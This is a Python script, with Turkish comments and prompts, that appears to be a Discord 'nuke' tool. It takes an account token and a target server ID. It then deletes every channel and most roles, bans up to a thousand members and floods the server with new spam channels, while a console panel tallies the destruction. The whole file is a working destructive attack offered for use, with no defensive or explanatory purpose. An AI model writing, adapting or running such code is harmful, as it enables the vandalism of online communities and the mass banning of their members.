import requests
import json
import os
import sys
import threading
import time
from colorama import Fore, init

# Kütüphane Kontrolü
try:
    import websocket
except ImportError:
    os.system("pip install websocket-client requests colorama")
    import websocket

init(autoreset=True)

# Global Değişkenler
TOKEN = ""
TARGET_GUILD_ID = ""
HEADERS = {}
START_TIME = time.time()

# İstatistikler
stats = {"silinen_kanal": 0, "silinen_rol": 0, "banlanan_uye": 0}

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def draw_panel():
    uptime = int(time.time() - START_TIME)
    clear_screen()
    print(Fore.CYAN + "=============================================")
    print(Fore.MAGENTA + "      👑 EMPIRE ADVANCED AUTO-SYSTEM 👑      ")
    print(Fore.CYAN + "=============================================")
    print(Fore.YELLOW + f"[*] Çalışma Süresi : {uptime} saniye")
    print(Fore.GREEN + f"[*] Silinen Kanal  : {stats['silinen_kanal']}")
    print(Fore.GREEN + f"[*] Silinen Rol    : {stats['silinen_rol']}")
    print(Fore.GREEN + f"[*] Banlanan Üye   : {stats['banlanan_uye']}")
    print(Fore.CYAN + "=============================================\n")

def validate_token(token):
    res = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
    return res.status_code == 200

def start_nuke(k_s, r_s, u_s, k_a, k_i):
    global HEADERS, TARGET_GUILD_ID, stats
    
    # 1. Kanallar
    ch_res = requests.get(f'https://discord.com/api/v9/guilds/{TARGET_GUILD_ID}/channels', headers=HEADERS)
    if ch_res.status_code == 200:
        for ch in ch_res.json():
            if requests.delete(f'https://discord.com/api/v9/channels/{ch["id"]}', headers=HEADERS).status_code in [200, 204]:
                stats["silinen_kanal"] += 1
                draw_panel()
                time.sleep(k_s)

    # 2. Roller
    r_res = requests.get(f'https://discord.com/api/v9/guilds/{TARGET_GUILD_ID}/roles', headers=HEADERS)
    if r_res.status_code == 200:
        for r in r_res.json():
            if r["name"] != "@everyone" and not r.get("managed"):
                if requests.delete(f'https://discord.com/api/v9/guilds/{TARGET_GUILD_ID}/roles/{r["id"]}', headers=HEADERS).status_code in [200, 204]:
                    stats["silinen_rol"] += 1
                    draw_panel()
                    time.sleep(r_s)

    # 3. Üyeler
    m_res = requests.get(f'https://discord.com/api/v9/guilds/{TARGET_GUILD_ID}/members?limit=1000', headers=HEADERS)
    if m_res.status_code == 200:
        for m in m_res.json():
            if requests.put(f'https://discord.com/api/v9/guilds/{TARGET_GUILD_ID}/bans/{m["user"]["id"]}', headers=HEADERS).status_code in [200, 204]:
                stats["banlanan_uye"] += 1
                draw_panel()
                time.sleep(u_s)

    # 4. Kanal Açma
    for _ in range(k_a):
        requests.post(f'https://discord.com/api/v9/guilds/{TARGET_GUILD_ID}/channels', 
                      headers=HEADERS, json={"name": k_i, "type": 0})

def on_message(ws, message):
    data = json.loads(message)
    if data.get("op") == 10:
        auth = {"op": 2, "d": {"token": TOKEN, "intents": 32767, "properties": {"$os": "linux", "$browser": "chrome", "$device": "pc"}}}
        ws.send(json.dumps(auth))

if __name__ == "__main__":
    clear_screen()
    print(Fore.CYAN + "=== GİRİŞ PANELİ ===")
    
    while True:
        TOKEN = input(Fore.YELLOW + "Token giriniz: ")
        if validate_token(TOKEN):
            HEADERS = {'Authorization': TOKEN, 'Content-Type': 'application/json'}
            break
        print(Fore.RED + "Geçersiz Token!")

    TARGET_GUILD_ID = input(Fore.YELLOW + "Sunucu ID: ")
    k_s = float(input("Kanal silme hızı: "))
    r_s = float(input("Rol silme hızı: "))
    u_s = float(input("Üye ban hızı: "))
    k_a = int(input("Kaç kanal açılsın?: "))
    k_i = input("Kanal ismi: ")

    threading.Thread(target=start_nuke, args=(k_s, r_s, u_s, k_a, k_i), daemon=True).start()
    
    ws = websocket.WebSocketApp("wss://gateway.discord.gg/?v=9&encoding=json", on_message=on_message)
    ws.run_forever()
